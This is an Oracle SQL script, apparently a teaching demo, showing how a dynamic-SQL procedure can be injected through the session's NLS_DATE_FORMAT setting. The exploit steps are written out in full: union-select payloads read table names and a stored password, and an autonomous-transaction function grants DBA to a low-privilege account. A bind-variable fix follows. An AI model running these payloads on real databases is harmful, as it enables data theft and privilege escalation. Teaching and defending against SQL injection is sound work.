-- SQL injection

conn eoda/foo

drop user devacct cascade;
drop table user_pw purge;

set echo on

create or replace procedure inj( p_date in date )
  as
          l_username   all_users.username%type;
          c            sys_refcursor;
          l_query      varchar2(4000);
  begin
          l_query := '
          select username
            from all_users
           where created = ''' ||p_date ||'''';

          dbms_output.put_line( l_query );
          open c for l_query;

          for i in 1 .. 5
          loop
                  fetch c into l_username;
                  exit when c%notfound;
                  dbms_output.put_line( l_username || '.....' );
          end loop;
          close c;
  end;
/

exec inj( sysdate )

create table user_pw
  ( uname varchar2(30) primary key,
    pw    varchar2(30)
);

insert into user_pw
  ( uname, pw )
values ( 'TKYTE', 'TOP SECRET' );

commit;

create user devacct identified by foobar;
grant create session   to devacct;
grant execute on inj   to devacct;
grant create procedure to devacct;

connect devacct/foobar;

alter session set
nls_date_format = '"''union select tname from tab-- "';

exec eoda.inj( sysdate )

alter session set nls_date_format = '"''union select tname||''/''||cname from col--"';

exec eoda.inj( sysdate )

alter session set nls_date_format = '"''union select uname||''/''||pw from user_pw--"';

exec eoda.inj( sysdate )

create or replace function foo
  return varchar2
  authid CURRENT_USER
  as
          pragma autonomous_transaction;
  begin
          execute immediate 'grant dba to devacct';
          return null;
  end;
/

grant execute on foo to eoda;

alter session set nls_date_format = '"''union select devacct.foo from dual--"';

select * from session_roles;

exec eoda.inj( sysdate )

connect devacct/foobar

select * from session_roles; 

conn eoda/foo

create or replace procedure NOT_inj( p_date in date )
  as
          l_username   all_users.username%type;
          c            sys_refcursor;
          l_query      varchar2(4000);
  begin
          l_query := '
          select username
            from all_users
           where created = :x';

          dbms_output.put_line( l_query );
          open c for l_query USING P_DATE;

          for i in 1 .. 5
          loop
                  fetch c into l_username;
                  exit when c%notfound;
                  dbms_output.put_line( l_username || '.....' );
          end loop;
          close c;
end;
/

set serverout on size 1000000
alter session set nls_date_format = '"''union select devacct.foo from dual--"';
select sysdate from dual;
exec NOT_inj(sysdate)
